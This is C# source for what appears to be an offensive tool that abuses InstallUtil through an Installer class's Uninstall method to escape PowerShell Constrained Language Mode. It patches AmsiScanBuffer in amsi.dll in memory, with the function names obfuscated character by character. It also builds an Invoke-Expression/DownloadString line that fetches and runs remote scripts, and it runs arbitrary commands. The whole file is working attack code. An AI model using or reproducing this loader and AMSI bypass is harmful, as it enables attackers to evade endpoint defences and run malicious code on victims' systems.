using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace CLMRout
{
    class Program
    {
        static void Main()
        {
            Console.WriteLine("Keep walking... nothing to see there...");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static int PatchAMSI()
        {
            string procName = string.Join(
                "", new char[] { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' });
            string libName = string.Join(
                "", new char[] { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' });

            IntPtr lpaddress = GetProcAddress(LoadLibrary(libName), procName);
            UIntPtr dwSize = (UIntPtr)5;
            byte[] source = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            VirtualProtect(lpaddress, dwSize, 0x40, out uint lpflOldProtect);
            Marshal.Copy(source, 0, lpaddress, 6);

            return 0;
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            List<KeyValuePair<string, string>> commands = new List<KeyValuePair<string, string>>();

            foreach (string key in Context.Parameters.Keys)
            {
                if ((new[] { "cmd", "url" }).Contains(key))
                {
                    switch (key)
                    {
                        case "cmd":
                            commands.Add(new KeyValuePair<string, string>(key, Context.Parameters[key]));
                            break;
                        case "url":
                            string[] urls = Context.Parameters[key].Split(';');
                            urls.ToList().ForEach(
                                x => commands.Add(
                                    new KeyValuePair<string, string>(
                                        key, string.Format("Invoke-Expression (New-Object Net.WebClient).DownloadString(\"{0}\")", x))));
                            break;
                        default:
                            // The default case is not entered for some reasons...
                            Console.WriteLine("Illegal argument: {0}", key);
                            break;
                            // throw new ArgumentException("Illegal argument: {0}", key);
                    }
                }
            }

            if (commands == null || commands.Count == 0)
            {
                Console.WriteLine("Required parameters missing. Set /cmd= to run a command or /url= to run a remote script");
                // throw new ArgumentException("Required parameters missing. Set /cmd= to run a command or /url= to run a remote script");
            }
            else
            {
                if (Context.Parameters.ContainsKey("patch"))
                {
                    Console.WriteLine("[+] Patching AMSI...");
                    PatchAMSI();
                }

                commands = commands.OrderByDescending(x => x.Key).ToList();

                string commandLine = string.Join("; ", commands.Select(x => x.Value));

                Console.WriteLine("[+] Running: {0}", commandLine);

                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (PowerShell powershell = PowerShell.Create())
                    {
                        powershell.Runspace = runspace;
                        powershell.AddScript(commandLine);

                        foreach (PSObject obj in powershell.Invoke())
                        {
                            Console.WriteLine(obj);
                        }

                        foreach (ErrorRecord error in powershell.Streams.Error.ReadAll())
                        {
                            Console.WriteLine(error);
                        }
                    }
                }
            }
        }
    }
}